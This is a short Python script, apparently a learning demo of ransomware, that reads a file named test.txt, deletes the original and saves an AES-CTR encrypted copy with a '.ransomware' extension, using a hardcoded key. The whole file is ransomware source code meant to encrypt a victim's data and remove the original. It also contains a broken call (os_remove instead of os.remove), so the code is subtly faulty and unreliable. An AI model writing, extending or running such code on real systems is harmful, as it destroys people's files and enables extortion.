import os
import pyaes

# Open file to encryption
file_name = 'test.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Remove original file
os_remove(file_name)

# defining encryption key
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Encryption file
crypto_data = aes.encrypt(file_data)

# Save encrypted file
new_file = file_name + '.ransomware'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
